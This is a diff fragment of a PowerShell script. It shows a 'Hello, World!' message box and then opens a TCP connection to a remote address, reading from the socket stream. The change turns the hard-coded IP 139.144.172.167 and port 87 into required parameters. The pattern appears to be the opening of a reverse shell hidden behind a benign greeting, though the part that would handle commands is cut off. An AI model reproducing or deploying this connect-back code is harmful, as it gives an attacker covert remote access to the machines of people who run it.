@@ -5,12 +5,17 @@ Add-Type -AssemblyName System.Drawing
 [System.Windows.Forms.MessageBox]::Show("Hello, World!", "PowerShell Alert", [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Information)
 
 
-$ip = "139.144.172.167"
-$port = 87
+param (
+    [Parameter(Mandatory = $true)]
+    [string]$IP,
+
+    [Parameter(Mandatory = $true)]
+    [int]$Port
+)
 
 try {
     $client = New-Object System.Net.Sockets.TcpClient
-    $client.Connect($ip, $port)
+    $client.Connect($IP, $Port)
 
     $stream = $client.GetStream()
     $reader = New-Object System.IO.StreamReader($stream)
